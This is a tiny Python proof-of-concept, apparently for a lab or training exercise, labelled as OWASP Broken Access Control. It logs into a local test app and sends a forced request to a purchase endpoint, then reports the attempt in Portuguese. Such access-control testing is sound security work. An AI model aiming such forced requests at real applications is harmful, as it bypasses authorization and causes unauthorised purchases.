#OWASP A01:2021 - Broken Access Control

import requests

s = requests.Session()
s.post("http://localhost:5000/login", data={"username": "teste", "password": "teste"})
s.get("http://localhost:5000/buy/5")
print("[+] Tentativa de compra forçada enviada.")
